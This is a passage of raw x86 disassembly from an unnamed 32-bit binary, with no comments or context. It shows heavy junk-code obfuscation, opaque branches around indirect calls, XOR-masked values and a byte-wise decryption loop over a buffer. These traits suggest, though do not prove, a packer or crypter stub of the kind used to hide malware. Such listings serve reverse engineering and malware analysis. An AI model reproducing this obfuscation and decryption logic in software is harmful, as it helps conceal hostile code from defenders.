  41d4a2:	movzx  ebx,BYTE PTR ds:0x42298a
  41d4a9:	jbe    0x41d4db
  41d4af:	push   0x47c6
  41d4b4:	push   DWORD PTR [ebp-0x28]
  41d4b7:	call   DWORD PTR ds:0x42a038
  41d4bd:	and    esi,0x3e8f
  41d4c3:	mov    esi,DWORD PTR ds:0x4228e6
  41d4c9:	add    DWORD PTR ds:0x42291e,esi
  41d4cf:	sub    esi,edx
  41d4d1:	sub    DWORD PTR ds:0x42297e,0xf26
  41d4db:	adc    DWORD PTR ds:0x4228ee,0x541b
  41d4e5:	xor    esi,esi
  41d4e7:	or     esi,DWORD PTR ds:0x422a3a
  41d4ed:	mov    edi,DWORD PTR ds:0x422ae6
  41d4f3:	sub    edi,esi
  41d4f5:	add    esi,DWORD PTR [esi+edi*1]
  41d4f8:	shr    ecx,0x2
  41d4fb:	mov    ecx,DWORD PTR [ebp+0x8]
  41d4fe:	mov    edx,DWORD PTR [ebp+0xc]
  41d501:	inc    ebx
  41d502:	xor    edx,edx
  41d504:	cmp    DWORD PTR ds:0x4229a2,0x0
  41d50b:	mov    ebx,DWORD PTR ds:0x422996
  41d511:	mov    DWORD PTR ds:0x422976,0x477d
  41d51b:	mov    DWORD PTR ds:0x4228c2,ebx
  41d521:	mov    DWORD PTR ds:0x4228ae,0x7a5c
  41d52b:	jmp    0x41d56e
  41d530:	mov    ebx,0x5fbd
  41d535:	je     0x41d56a
  41d53b:	push   DWORD PTR [ebp-0x28]
  41d53e:	push   0x41f8
  41d543:	push   0x6fc1
  41d548:	push   DWORD PTR [ebp-0x24]
  41d54b:	call   DWORD PTR ds:0x42a05c
  41d551:	and    DWORD PTR ds:0x42296a,edi
  41d557:	sub    edi,esi
  41d559:	mov    ebx,DWORD PTR ds:0x422a86
  41d55f:	mov    esi,DWORD PTR ds:0x422a9a
  41d565:	sub    esi,ebx
  41d567:	sub    ebx,DWORD PTR [ebx+esi*1]
  41d56a:	sbb    edi,esi
  41d56c:	not    esi
  41d56e:	mov    esi,0x2e9a655c
  41d573:	xor    eax,esi
  41d575:	cmp    DWORD PTR ds:0x422946,0x0
  41d57c:	mov    DWORD PTR ds:0x4229aa,ecx
  41d582:	mov    DWORD PTR ds:0x422936,0x719b
  41d58c:	mov    DWORD PTR ds:0x42290a,0x79d9
  41d596:	mov    DWORD PTR ds:0x4229ba,ecx
  41d59c:	jmp    0x41d625
  41d5a1:	mov    DWORD PTR ds:0x4229b6,0x57de
  41d5ab:	mov    DWORD PTR ds:0x42298e,0x236c
  41d5b5:	ja     0x41d5f7
  41d5bb:	push   0x3fc3
  41d5c0:	push   0x4225dc
  41d5c5:	call   DWORD PTR ds:0x42a060
  41d5cb:	sbb    ebx,DWORD PTR ds:0x42294a
  41d5d1:	mov    ebx,DWORD PTR ds:0x422892
  41d5d7:	adc    DWORD PTR ds:0x42289e,ebx
  41d5dd:	xor    ebx,ebx
  41d5df:	or     ebx,DWORD PTR ds:0x422a7a
  41d5e5:	mov    ebx,DWORD PTR [ebx]
  41d5e7:	adc    DWORD PTR ds:0x4229d2,ebx
  41d5ed:	mov    DWORD PTR ds:0x4228ba,0x6b73
  41d5f7:	and    ebx,edi
  41d5f9:	sub    edi,DWORD PTR ds:0x422972
  41d5ff:	adc    ebx,DWORD PTR ds:0x422922
  41d605:	movzx  ebx,BYTE PTR ds:0x422926
  41d60c:	adc    DWORD PTR ds:0x42294e,ebx
  41d612:	mov    edi,DWORD PTR ds:0x4229da
  41d618:	xor    ebx,ebx
  41d61a:	or     ebx,DWORD PTR ds:0x422a2e
  41d620:	sub    ebx,edi
  41d622:	or     edi,DWORD PTR [edi+ebx*1]
  41d625:	or     eax,edx
  41d627:	mov    DWORD PTR ds:0x4228fe,0x3549
  41d631:	mov    DWORD PTR [ebp-0x28],eax
  41d634:	mov    eax,DWORD PTR [ebp+0x8]
  41d637:	or     edx,0x76a
  41d63d:	shl    ecx,0x1e
  41d640:	cmp    DWORD PTR ds:0x4229aa,0x0
  41d647:	mov    DWORD PTR ds:0x42297e,ebx
  41d64d:	mov    ecx,DWORD PTR ds:0x4229be
  41d653:	mov    DWORD PTR ds:0x422962,0x9fe
  41d65d:	jmp    0x41d6c8
  41d662:	mov    DWORD PTR ds:0x4228de,edx
  41d668:	mov    edx,DWORD PTR ds:0x4228ae
  41d66e:	jae    0x41d6ad
  41d674:	push   DWORD PTR [ebp-0x18]
  41d677:	push   DWORD PTR [ebp-0x18]
  41d67a:	call   DWORD PTR ds:0x42a064
  41d680:	mov    edx,DWORD PTR ds:0x422abe
  41d686:	mov    ecx,DWORD PTR ds:0x422ac6
  41d68c:	sub    edx,ecx
  41d68e:	or     edx,DWORD PTR [edx+ecx*1]
  41d691:	mov    edi,DWORD PTR ds:0x4229ba
  41d697:	sbb    edi,DWORD PTR ds:0x4228ba
  41d69d:	mov    DWORD PTR ds:0x4229ba,edi
  41d6a3:	or     DWORD PTR ds:0x422966,0x5f8
  41d6ad:	adc    DWORD PTR ds:0x42298e,0x1669
  41d6b7:	mov    ecx,DWORD PTR ds:0x422a52
  41d6bd:	mov    ebx,DWORD PTR ds:0x422ac2
  41d6c3:	sub    ebx,ecx
  41d6c5:	or     ecx,DWORD PTR [ecx+ebx*1]
  41d6c8:	mov    ecx,DWORD PTR [ebp+0xc]
  41d6cb:	xor    edi,0x396f
  41d6d1:	shrd   eax,ecx,0x2
  41d6d5:	adc    DWORD PTR ds:0x42295a,edi
  41d6db:	xor    eax,esi
  41d6dd:	adc    ebx,edi
  41d6df:	shr    ecx,0x2
  41d6e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41d6e5:	inc    ebx
  41d6e6:	mov    edx,DWORD PTR [ebp+0xc]
  41d6e9:	xor    edx,edx
  41d6eb:	xor    ebx,DWORD PTR ds:0x42295a
  41d6f1:	or     eax,edx
  41d6f3:	sub    edx,0x59e2
  41d6f9:	mov    DWORD PTR [ebp-0x28],eax
  41d6fc:	mov    eax,ds:0x4220e8
  41d701:	add    DWORD PTR ds:0x4228d2,edx
  41d707:	mov    eax,DWORD PTR [eax]
  41d709:	xor    DWORD PTR ds:0x42293a,0x4228c2
  41d713:	mov    DWORD PTR [ebp-0xc],eax
  41d716:	mov    eax,ds:0x422308
  41d71b:	sub    ebx,0x7e01
  41d721:	mov    eax,DWORD PTR [eax]
  41d723:	mov    ebx,DWORD PTR ds:0x422a42
  41d729:	xor    edi,edi
  41d72b:	xor    edi,DWORD PTR ds:0x422a9a
  41d731:	sub    edi,ebx
  41d733:	and    ebx,DWORD PTR [ebx+edi*1]
  41d736:	mov    DWORD PTR [ebp-0x10],eax
  41d739:	cmp    DWORD PTR ds:0x4229c6,0x0
  41d740:	mov    DWORD PTR ds:0x42295a,ebx
  41d746:	mov    DWORD PTR ds:0x42297e,0x12ca
  41d750:	jmp    0x41d790
  41d755:	mov    DWORD PTR ds:0x4229c2,ebx
  41d75b:	jl     0x41d778
  41d761:	push   0x4227af
  41d766:	call   DWORD PTR ds:0x42a180
  41d76c:	dec    DWORD PTR ds:0x4228de
  41d772:	or     edi,DWORD PTR ds:0x4229c6
  41d778:	adc    DWORD PTR ds:0x422902,0x16ea
  41d782:	or     DWORD PTR ds:0x42291e,ecx
  41d788:	neg    edi
  41d78a:	sbb    DWORD PTR ds:0x4228c6,edx
  41d790:	mov    eax,DWORD PTR [ebp-0xc]
  41d793:	or     eax,DWORD PTR ds:0x422936
  41d799:	mov    eax,DWORD PTR [ebp-0xc]
  41d79c:	or     DWORD PTR ds:0x42297e,0xd91
  41d7a6:	shl    ecx,0x1e
  41d7a9:	sub    DWORD PTR ds:0x4228da,0x4229c2
  41d7b3:	xor    ecx,ecx
  41d7b5:	adc    DWORD PTR ds:0x422972,ecx
  41d7bb:	shld   ecx,eax,0x2
  41d7bf:	cmp    DWORD PTR ds:0x4229ba,0x0
  41d7c6:	movzx  ebx,BYTE PTR ds:0x422926
  41d7cd:	mov    DWORD PTR ds:0x4228fe,0x7bb6
  41d7d7:	mov    DWORD PTR ds:0x422922,edi
  41d7dd:	movzx  ebx,BYTE PTR ds:0x422966
  41d7e4:	jmp    0x41d85d
  41d7e9:	mov    DWORD PTR ds:0x4229b6,0x5617
  41d7f3:	mov    DWORD PTR ds:0x4229ca,0x1a8d
  41d7fd:	je     0x41d832
  41d803:	push   0x4228c6
  41d808:	push   0x422906
  41d80d:	push   0x148f
  41d812:	call   DWORD PTR ds:0x42a068
  41d818:	xor    ebx,ebx
  41d81a:	add    ebx,DWORD PTR ds:0x422a8a
  41d820:	mov    edx,DWORD PTR ds:0x422ada
  41d826:	sub    ebx,edx
  41d828:	xor    ebx,DWORD PTR [ebx+edx*1]
  41d82b:	add    ebx,DWORD PTR ds:0x422906
  41d831:	inc    ebx
  41d832:	movzx  edx,BYTE PTR ds:0x42291e
  41d839:	or     edx,DWORD PTR ds:0x42290e
  41d83f:	mov    DWORD PTR ds:0x42291e,edx
  41d845:	mov    DWORD PTR ds:0x4228be,0x3c15
  41d84f:	xor    edi,edi
  41d851:	add    edi,DWORD PTR ds:0x42296a
  41d857:	and    DWORD PTR ds:0x4229a2,edi
  41d85d:	mov    edi,DWORD PTR [ebp+0x8]
  41d860:	mov    ebx,DWORD PTR [ebp+0xc]
  41d863:	shl    eax,0x2
  41d866:	and    edx,DWORD PTR ds:0x422996
  41d86c:	mov    DWORD PTR [ebp-0x34],ebx
  41d86f:	or     edx,DWORD PTR ds:0x422942
  41d875:	xor    ebx,ebx
  41d877:	or     edx,DWORD PTR ds:0x42297e
  41d87d:	mov    edx,0x9c0a89d8
  41d882:	xor    DWORD PTR ds:0x42293e,0x38e7
  41d88c:	xor    eax,0xba699573
  41d891:	xor    ecx,edx
  41d893:	mov    DWORD PTR ds:0x422966,0x5827
  41d89d:	inc    ebx
  41d89e:	mov    DWORD PTR ds:0x42288e,0x1c53
  41d8a8:	mov    DWORD PTR [ebp-0x1c],0xa3e69b9d
  41d8af:	mov    DWORD PTR ds:0x42296a,0x3d21
  41d8b9:	mov    DWORD PTR [ebp-0x18],0xa3e6929d
  41d8c0:	mov    DWORD PTR ds:0x4228d6,0x742f
  41d8ca:	cmp    eax,edi
  41d8cc:	mov    DWORD PTR ds:0x42289e,0x5996
  41d8d6:	jne    0x41d8f9
  41d8dc:	mov    DWORD PTR ds:0x4228e2,0x7e38
  41d8e6:	cmp    ecx,DWORD PTR [ebp-0x34]
  41d8e9:	mov    DWORD PTR ds:0x422976,0x4e71
  41d8f3:	je     0x41de92
  41d8f9:	xor    edi,edi
  41d8fb:	mov    eax,DWORD PTR [ebp-0x10]
  41d8fe:	mov    eax,DWORD PTR [ebp-0x10]
  41d901:	and    edi,0x18bc
  41d907:	xor    ecx,ecx
  41d909:	shld   ecx,eax,0x2
  41d90d:	cmp    DWORD PTR ds:0x4228a6,0x0
  41d914:	not    edi
  41d916:	mov    DWORD PTR ds:0x422916,0x65a0
  41d920:	mov    edi,DWORD PTR ds:0x4229c6
  41d926:	jmp    0x41d980
  41d92b:	mov    DWORD PTR ds:0x42291e,0x42bf
  41d935:	jl     0x41d960
  41d93b:	push   DWORD PTR [ebp-0x18]
  41d93e:	call   DWORD PTR ds:0x42a184
  41d944:	mov    edi,DWORD PTR ds:0x42292a
  41d94a:	xor    DWORD PTR ds:0x42297e,edi
  41d950:	add    edi,DWORD PTR ds:0x422926
  41d956:	and    DWORD PTR ds:0x42296e,0x3699
  41d960:	sub    DWORD PTR ds:0x4229d2,ecx
  41d966:	xor    DWORD PTR ds:0x42291a,0x37de
  41d970:	sbb    edi,0x14bf
  41d976:	sbb    DWORD PTR ds:0x422906,0x2f26
  41d980:	shl    eax,0x2
  41d983:	xor    ecx,edx
  41d985:	mov    edx,DWORD PTR [ebp+0x8]
  41d988:	cmp    DWORD PTR ds:0x4228f6,0x0
  41d98f:	mov    DWORD PTR ds:0x4229b2,0x11be
  41d999:	mov    edi,DWORD PTR ds:0x42298a
  41d99f:	mov    edi,0x436a
  41d9a4:	mov    edi,0x787d
  41d9a9:	jmp    0x41da14
  41d9ae:	mov    DWORD PTR ds:0x42294e,ecx
  41d9b4:	jne    0x41d9e7
  41d9ba:	push   0x58ed
  41d9bf:	push   DWORD PTR [ebp-0xc]
  41d9c2:	push   0x4fe0
  41d9c7:	call   DWORD PTR ds:0x42a188
  41d9cd:	sub    DWORD PTR ds:0x4228c2,0x42290a
  41d9d7:	inc    DWORD PTR ds:0x422916
  41d9dd:	sub    DWORD PTR ds:0x4228f2,0x2f59
  41d9e7:	movzx  edi,BYTE PTR ds:0x42295e
  41d9ee:	or     edi,DWORD PTR ds:0x4229b6
  41d9f4:	mov    DWORD PTR ds:0x42295e,edi
  41d9fa:	sub    DWORD PTR ds:0x4229c2,edx
  41da00:	adc    DWORD PTR ds:0x42299a,0x4229a2
  41da0a:	and    DWORD PTR ds:0x4228be,0x217e
  41da14:	mov    edi,DWORD PTR [ebp+0xc]
  41da17:	xor    eax,0xba699573
  41da1c:	mov    DWORD PTR ds:0x4229ae,0x94b
  41da26:	cmp    eax,edx
  41da28:	mov    DWORD PTR ds:0x4229be,0x7ea4
  41da32:	jne    0x41da4a
  41da38:	mov    DWORD PTR ds:0x4228ee,0x77f8
  41da42:	cmp    ecx,edi
  41da44:	je     0x41de92
  41da4a:	cmp    DWORD PTR ds:0x42292a,0x0
  41da51:	mov    DWORD PTR ds:0x4228e6,0x4ba6
  41da5b:	mov    DWORD PTR ds:0x42289e,0x1c76
  41da65:	jmp    0x41dac8
  41da6a:	mov    ecx,DWORD PTR ds:0x422892
  41da70:	mov    DWORD PTR ds:0x422892,0x488a
  41da7a:	jg     0x41daaf
  41da80:	push   0x42298a
  41da85:	push   DWORD PTR [ebp-0xc]
  41da88:	push   0x422737
  41da8d:	push   0x58d5
  41da92:	call   DWORD PTR ds:0x42a18c
  41da98:	mov    ecx,DWORD PTR ds:0x42299a
  41da9e:	sbb    DWORD PTR ds:0x4229aa,ecx
  41daa4:	xor    DWORD PTR ds:0x422986,0x108
  41daae:	dec    ecx
  41daaf:	sbb    ecx,DWORD PTR ds:0x4229c2
  41dab5:	mov    ecx,DWORD PTR ds:0x422aa6
  41dabb:	xor    edi,edi
  41dabd:	xor    edi,DWORD PTR ds:0x422aee
  41dac3:	sub    ecx,edi
  41dac5:	add    ecx,DWORD PTR [ecx+edi*1]
  41dac8:	mov    eax,DWORD PTR [ebp-0x18]
  41dacb:	adc    DWORD PTR ds:0x422922,0x2ce9
  41dad5:	mov    ecx,DWORD PTR [ebp-0x18]
  41dad8:	neg    edi
  41dada:	xor    ecx,ebx
  41dadc:	shl    ecx,0x1e
  41dadf:	sbb    DWORD PTR ds:0x4229b2,edx
  41dae5:	mov    edi,0xa3e69a9f
  41daea:	xor    eax,edi
  41daec:	shr    eax,0x2
  41daef:	or     DWORD PTR ds:0x42298a,0x42289a
  41daf9:	or     eax,ecx
  41dafb:	cmp    DWORD PTR ds:0x42299a,0x0
  41db02:	movzx  ecx,WORD PTR ds:0x42293a
  41db09:	not    ecx
  41db0b:	jmp    0x41db6f
  41db10:	mov    DWORD PTR ds:0x4229d2,0x1c9
  41db1a:	je     0x41db49
  41db20:	push   0x1982
  41db25:	call   DWORD PTR ds:0x42a2a4
  41db2b:	sub    ecx,0x256c
  41db31:	sub    DWORD PTR ds:0x4229d2,edx
  41db37:	mov    ecx,DWORD PTR ds:0x4229ca
  41db3d:	or     DWORD PTR ds:0x42297a,ecx
  41db43:	add    DWORD PTR ds:0x42293e,edx
  41db49:	xor    ecx,0x2a90
  41db4f:	adc    ecx,DWORD PTR ds:0x4228e2
  41db55:	xor    DWORD PTR ds:0x4228c2,edx
  41db5b:	xor    ecx,ecx
  41db5d:	or     ecx,DWORD PTR ds:0x4228e2
  41db63:	and    DWORD PTR ds:0x4228f6,ecx
  41db69:	sbb    DWORD PTR ds:0x422932,edx
  41db6f:	mov    DWORD PTR [ebp-0x34],eax
  41db72:	xor    ecx,0x70df
  41db78:	mov    eax,ds:0x422268
  41db7d:	mov    ecx,DWORD PTR ds:0x4228d2
  41db83:	adc    ecx,DWORD PTR ds:0x422976
  41db89:	mov    DWORD PTR ds:0x4228d2,ecx
  41db8f:	mov    DWORD PTR [ebp-0x34],eax
  41db92:	xor    eax,eax
  41db94:	xor    eax,DWORD PTR ds:0x4228a6
  41db9a:	sbb    DWORD PTR ds:0x42294a,eax
  41dba0:	mov    eax,DWORD PTR [ebp-0xc]
  41dba3:	cmp    DWORD PTR ds:0x4229c6,0x0
  41dbaa:	mov    DWORD PTR ds:0x4228fe,0x1213
  41dbb4:	movzx  ecx,WORD PTR ds:0x4228b2
  41dbbb:	jmp    0x41dc28
  41dbc0:	mov    DWORD PTR ds:0x42298a,0x52a1
  41dbca:	mov    DWORD PTR ds:0x422962,edx
  41dbd0:	jg     0x41dc05
  41dbd6:	push   DWORD PTR [ebp-0x24]
  41dbd9:	push   0x4008
  41dbde:	push   0x37a6
  41dbe3:	call   DWORD PTR ds:0x42a06c
  41dbe9:	and    ecx,DWORD PTR ds:0x422946
  41dbef:	sub    DWORD PTR ds:0x42291a,ebx
  41dbf5:	adc    DWORD PTR ds:0x4228e6,edx
  41dbfb:	xor    DWORD PTR ds:0x42290a,0x1acd
  41dc05:	dec    ecx
  41dc06:	add    DWORD PTR ds:0x42289a,0x219e
  41dc10:	mov    ecx,DWORD PTR ds:0x4228fa
  41dc16:	and    DWORD PTR ds:0x42291a,ecx
  41dc1c:	mov    ecx,DWORD PTR ds:0x4228e6
  41dc22:	or     DWORD PTR ds:0x4228ae,ecx
  41dc28:	mov    DWORD PTR [ebp-0x14],eax
  41dc2b:	cmp    DWORD PTR ds:0x42299a,0x0
  41dc32:	mov    DWORD PTR ds:0x4228f6,0x5b1a
  41dc3c:	mov    ecx,0x5f2a
  41dc41:	jmp    0x41dc74
  41dc46:	mov    DWORD PTR ds:0x422922,0x1bb2
  41dc50:	jg     0x41dc67
  41dc56:	push   DWORD PTR [ebp-0x1c]
  41dc59:	call   DWORD PTR ds:0x42a190
  41dc5f:	or     ecx,ecx
  41dc61:	add    ecx,DWORD PTR ds:0x4228ba
  41dc67:	xor    ecx,ecx
  41dc69:	dec    ecx
  41dc6a:	or     DWORD PTR ds:0x4228de,0x336d
  41dc74:	mov    ecx,DWORD PTR [ebp-0x14]
  41dc77:	push   0x4
  41dc79:	pop    eax
  41dc7a:	sub    eax,ecx
  41dc7c:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7f:	add    ecx,eax
  41dc81:	mov    DWORD PTR [ebp-0x24],ecx
  41dc84:	lea    eax,[ebp-0x30]
  41dc87:	mov    DWORD PTR [ebp-0x2c],eax
  41dc8a:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc8d:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc90:	xor    eax,edi
  41dc92:	xor    ecx,ebx
  41dc94:	shr    eax,0x2
  41dc97:	shl    ecx,0x1e
  41dc9a:	or     eax,ecx
  41dc9c:	mov    DWORD PTR [ebp-0x20],eax
  41dc9f:	mov    DWORD PTR [ebp-0x8],0xa3e69a8d
  41dca6:	mov    eax,DWORD PTR [ebp-0x8]
  41dca9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dcac:	xor    eax,edi
  41dcae:	xor    ecx,ebx
  41dcb0:	shr    eax,0x2
  41dcb3:	shl    ecx,0x1e
  41dcb6:	or     ecx,eax
  41dcb8:	push   ecx
  41dcb9:	lea    eax,[ebp-0x8]
  41dcbc:	push   eax
  41dcbd:	lea    eax,[ebp-0x7c]
  41dcc0:	push   eax
  41dcc1:	call   0x41d307
  41dcc6:	mov    eax,DWORD PTR [ebp-0x8]
  41dcc9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dccc:	xor    eax,edi
  41dcce:	xor    ecx,ebx
  41dcd0:	shr    eax,0x2
  41dcd3:	shl    ecx,0x1e
  41dcd6:	or     ecx,eax
  41dcd8:	push   ecx
  41dcd9:	lea    eax,[ebp-0x14]
  41dcdc:	push   eax
  41dcdd:	mov    eax,DWORD PTR [ebp+0x8]
  41dce0:	mov    ecx,DWORD PTR [ebp+0xc]
  41dce3:	shrd   eax,ecx,0x2
  41dce7:	shr    ecx,0x2
  41dcea:	mov    ecx,DWORD PTR [ebp+0x8]
  41dced:	mov    edx,DWORD PTR [ebp+0xc]
  41dcf0:	xor    eax,esi
  41dcf2:	xor    edx,edx
  41dcf4:	or     eax,edx
  41dcf6:	lea    eax,[ebp+eax*4-0x78]
  41dcfa:	push   eax
  41dcfb:	shl    ecx,0x1e
  41dcfe:	call   0x41d307
  41dd03:	mov    eax,DWORD PTR [ebp-0x8]
  41dd06:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd09:	xor    eax,edi
  41dd0b:	xor    ecx,ebx
  41dd0d:	shr    eax,0x2
  41dd10:	shl    ecx,0x1e
  41dd13:	or     ecx,eax
  41dd15:	push   ecx
  41dd16:	lea    eax,[ebp-0x24]
  41dd19:	push   eax
  41dd1a:	mov    eax,DWORD PTR [ebp+0x10]
  41dd1d:	mov    ecx,DWORD PTR [ebp+0x14]
  41dd20:	shrd   eax,ecx,0x2
  41dd24:	shr    ecx,0x2
  41dd27:	mov    ecx,DWORD PTR [ebp+0x10]
  41dd2a:	mov    edx,DWORD PTR [ebp+0x14]
  41dd2d:	xor    eax,esi
  41dd2f:	xor    edx,edx
  41dd31:	or     eax,edx
  41dd33:	lea    eax,[ebp+eax*4-0x78]
  41dd37:	push   eax
  41dd38:	shl    ecx,0x1e
  41dd3b:	call   0x41d307
  41dd40:	mov    eax,DWORD PTR [ebp-0x8]
  41dd43:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd46:	xor    ecx,ebx
  41dd48:	xor    eax,edi
  41dd4a:	shl    ecx,0x1e
  41dd4d:	shr    eax,0x2
  41dd50:	or     ecx,eax
  41dd52:	push   ecx
  41dd53:	lea    eax,[ebp-0x20]
  41dd56:	push   eax
  41dd57:	mov    eax,DWORD PTR [ebp+0x10]
  41dd5a:	mov    ecx,DWORD PTR [ebp+0x14]
  41dd5d:	shrd   eax,ecx,0x2
  41dd61:	shr    ecx,0x2
  41dd64:	mov    ecx,DWORD PTR [ebp+0x10]
  41dd67:	mov    edx,DWORD PTR [ebp+0x14]
  41dd6a:	xor    edx,edx
  41dd6c:	xor    eax,esi
  41dd6e:	or     eax,edx
  41dd70:	shl    ecx,0x1e
  41dd73:	mov    ecx,DWORD PTR [ebp+0x10]
  41dd76:	mov    edx,DWORD PTR [ebp+0x14]
  41dd79:	shrd   ecx,edx,0x2
  41dd7d:	shr    edx,0x2
  41dd80:	mov    edx,DWORD PTR [ebp+0x10]
  41dd83:	mov    ebx,DWORD PTR [ebp+0x14]
  41dd86:	xor    ecx,esi
  41dd88:	xor    ebx,ebx
  41dd8a:	or     ecx,ebx
  41dd8c:	add    eax,ecx
  41dd8e:	lea    eax,[ebp+eax*4-0x78]
  41dd92:	push   eax
  41dd93:	shl    edx,0x1e
  41dd96:	call   0x41d307
  41dd9b:	mov    eax,DWORD PTR [ebp-0x8]
  41dd9e:	mov    ecx,DWORD PTR [ebp-0x8]
  41dda1:	xor    ecx,0x1
  41dda4:	shl    ecx,0x1e
  41dda7:	xor    eax,edi
  41dda9:	shr    eax,0x2
  41ddac:	or     ecx,eax
  41ddae:	push   ecx
  41ddaf:	lea    eax,[ebp-0x2c]
  41ddb2:	push   eax
  41ddb3:	mov    eax,DWORD PTR [ebp+0x10]
  41ddb6:	mov    ecx,DWORD PTR [ebp+0x14]
  41ddb9:	shrd   eax,ecx,0x2
  41ddbd:	shr    ecx,0x2
  41ddc0:	mov    ecx,DWORD PTR [ebp+0x10]
  41ddc3:	mov    edx,DWORD PTR [ebp+0x14]
  41ddc6:	xor    edx,edx
  41ddc8:	shl    ecx,0x1e
  41ddcb:	mov    ecx,DWORD PTR [ebp+0x10]
  41ddce:	xor    eax,esi
  41ddd0:	or     eax,edx
  41ddd2:	mov    edx,DWORD PTR [ebp+0x14]
  41ddd5:	shrd   ecx,edx,0x2
  41ddd9:	shr    edx,0x2
  41dddc:	mov    edx,DWORD PTR [ebp+0x10]
  41dddf:	mov    ebx,DWORD PTR [ebp+0x14]
  41dde2:	xor    ecx,esi
  41dde4:	xor    ebx,ebx
  41dde6:	or     ecx,ebx
  41dde8:	shl    edx,0x1e
  41ddeb:	add    eax,ecx
  41dded:	mov    ecx,DWORD PTR [ebp+0x10]
  41ddf0:	mov    edx,DWORD PTR [ebp+0x14]
  41ddf3:	shrd   ecx,edx,0x2
  41ddf7:	shr    edx,0x2
  41ddfa:	mov    edx,DWORD PTR [ebp+0x10]
  41ddfd:	mov    ebx,DWORD PTR [ebp+0x14]
  41de00:	xor    ecx,esi
  41de02:	xor    ebx,ebx
  41de04:	or     ecx,ebx
  41de06:	add    eax,ecx
  41de08:	lea    eax,[ebp+eax*4-0x78]
  41de0c:	push   eax
  41de0d:	shl    edx,0x1e
  41de10:	call   0x41d307
  41de15:	mov    eax,DWORD PTR [ebp-0x7c]
  41de18:	mov    ecx,DWORD PTR [ebp-0x7c]
  41de1b:	xor    eax,edi
  41de1d:	shr    eax,0x2
  41de20:	inc    ebx
  41de21:	xor    ecx,ebx
  41de23:	shl    ecx,0x1e
  41de26:	or     ecx,eax
  41de28:	mov    DWORD PTR [ebp-0x7c],ecx
  41de2b:	lea    eax,[ebp-0x7c]
  41de2e:	push   eax
  41de2f:	mov    eax,DWORD PTR [ebp+0x10]
  41de32:	mov    ecx,DWORD PTR [ebp+0x14]
  41de35:	shrd   eax,ecx,0x2
  41de39:	shr    ecx,0x2
  41de3c:	mov    ecx,DWORD PTR [ebp+0x10]
  41de3f:	mov    edx,DWORD PTR [ebp+0x14]
  41de42:	xor    eax,esi
  41de44:	xor    edx,edx
  41de46:	or     eax,edx
  41de48:	push   eax
  41de49:	mov    eax,ds:0x422298
  41de4e:	mov    edi,0x4221de
  41de53:	push   edi
  41de54:	push   DWORD PTR [eax]
  41de56:	shl    ecx,0x1e
  41de59:	call   0x41f834
  41de5e:	lea    eax,[ebp-0x7c]
  41de61:	push   eax
  41de62:	mov    eax,DWORD PTR [ebp+0x10]
  41de65:	mov    ecx,DWORD PTR [ebp+0x14]
  41de68:	shrd   eax,ecx,0x2
  41de6c:	shr    ecx,0x2
  41de6f:	mov    ecx,DWORD PTR [ebp+0x10]
  41de72:	mov    edx,DWORD PTR [ebp+0x14]
  41de75:	xor    eax,esi
  41de77:	xor    edx,edx
  41de79:	or     eax,edx
  41de7b:	push   eax
  41de7c:	mov    eax,ds:0x422298
  41de81:	push   edi
  41de82:	push   DWORD PTR [eax]
  41de84:	shl    ecx,0x1e
  41de87:	call   0x41f834
  41de8c:	mov    eax,DWORD PTR [ebp-0x30]
  41de8f:	mov    eax,DWORD PTR [ebp-0x20]
  41de92:	mov    edi,DWORD PTR [ebp-0x14]
  41de95:	mov    eax,DWORD PTR [ebp-0x24]
  41de98:	mov    ecx,edi
  41de9a:	mov    DWORD PTR [ebp-0x18],eax
  41de9d:	rol    ecx,0x2
  41dea0:	mov    eax,0xa3e69a9d
  41dea5:	xor    ecx,eax
  41dea7:	cmp    ecx,eax
  41dea9:	je     0x41df8b
  41deaf:	mov    DWORD PTR [ebp-0x1c],0x1001
  41deb6:	mov    ecx,DWORD PTR [ebp-0x18]
  41deb9:	xor    eax,eax
  41debb:	mov    DWORD PTR [ebp-0x34],ecx
  41debe:	test   ecx,ecx
  41dec0:	je     0x41deec
  41dec6:	mov    cl,BYTE PTR [eax+edi*1]
  41dec9:	mov    BYTE PTR [ebp-0x1],cl
  41decc:	movzx  ecx,BYTE PTR [ebp-0x1]
  41ded0:	sub    ecx,0xea
  41ded6:	mov    BYTE PTR [ebp-0x1],cl
  41ded9:	ror    BYTE PTR [ebp-0x1],1
  41dedc:	mov    cl,BYTE PTR [ebp-0x1]
  41dedf:	mov    BYTE PTR [eax+edi*1],cl
  41dee2:	inc    eax
  41dee3:	cmp    eax,DWORD PTR [ebp-0x34]
  41dee6:	jb     0x41dec6
  41deec:	dec    DWORD PTR [ebp-0x1c]
  41deef:	jne    0x41deb6
  41def5:	mov    eax,DWORD PTR [ebp+0x8]
  41def8:	mov    ecx,DWORD PTR [ebp+0xc]
  41defb:	shrd   eax,ecx,0x2
  41deff:	shr    ecx,0x2
  41df02:	mov    ecx,DWORD PTR [ebp+0x8]
  41df05:	mov    edx,DWORD PTR [ebp+0xc]
  41df08:	xor    eax,esi
  41df0a:	xor    edx,edx
  41df0c:	or     eax,edx
  41df0e:	push   ebx
  41df0f:	add    eax,edi
  41df11:	push   eax
  41df12:	lea    eax,[ebp-0x2]
  41df15:	push   eax
  41df16:	shl    ecx,0x1e
  41df19:	call   0x41d307
  41df1e:	mov    eax,DWORD PTR [ebp+0x10]
  41df21:	mov    ecx,DWORD PTR [ebp+0x14]
  41df24:	shrd   eax,ecx,0x2
  41df28:	shr    ecx,0x2
  41df2b:	mov    ecx,DWORD PTR [ebp+0x10]
  41df2e:	mov    edx,DWORD PTR [ebp+0x14]
  41df31:	xor    eax,esi
  41df33:	xor    edx,edx
  41df35:	or     eax,edx
  41df37:	add    eax,edi
  41df39:	push   ebx
  41df3a:	push   eax
  41df3b:	mov    eax,DWORD PTR [ebp+0x8]
  41df3e:	shl    ecx,0x1e
  41df41:	mov    ecx,DWORD PTR [ebp+0xc]
  41df44:	shrd   eax,ecx,0x2
  41df48:	shr    ecx,0x2
  41df4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41df4e:	mov    edx,DWORD PTR [ebp+0xc]
  41df51:	xor    eax,esi
  41df53:	xor    edx,edx
  41df55:	or     eax,edx
  41df57:	add    eax,edi
  41df59:	push   eax
  41df5a:	shl    ecx,0x1e
